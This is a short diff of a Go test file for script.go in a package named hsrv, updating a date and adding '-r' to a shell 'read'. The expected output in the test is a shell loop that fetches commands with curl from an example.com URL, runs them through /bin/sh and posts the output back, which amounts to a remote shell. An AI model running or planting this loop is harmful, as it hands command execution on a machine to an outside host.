@@ -5,7 +5,7 @@ package hsrv
  * Tests for script.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240327
+ * Last Modified 20240328
  */
 
 import (
@@ -53,7 +53,7 @@ func TestServerScriptHandler(t *testing.T) {
 
 curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/i/IDID </dev/null 2>&0 |
 /bin/sh 2>&1 |
-while read line; do
+while read -r line; do
 	if ! curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/o/IDID --data-binary @- <<_eof-IDID; then
 $line
 _eof-IDID
